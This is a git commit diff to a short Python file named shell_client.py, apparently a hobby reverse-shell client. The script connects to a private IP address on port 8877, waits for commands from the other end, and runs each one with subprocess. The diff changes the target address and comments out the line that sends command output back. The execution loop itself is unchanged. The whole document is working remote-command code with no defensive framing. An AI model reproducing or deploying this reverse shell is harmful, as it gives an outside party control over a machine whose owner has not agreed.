556ece4a21a2a3cf72ce003aba9724166f6212b3
Ibrashos <Ibrashos@gmail.com>
2022-12-06 14:07:59 +0300

    Update shell_client.py

--- unformed/shell_client.py
+++ unformed/shell_client.py
@@ -1,12 +1,12 @@
 import socket
 import subprocess
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('10.10.0.102', 8877))
+s.connect(('10.10.0.42', 8877))
 
 while True:
 	command = s.recv(1024).decode()
 	if command.lower() == 'exit':
 		break
 	output = subprocess.getoutput(command)
-	s.send(output.encode())
+	#s.send(output.encode())
 s.close()
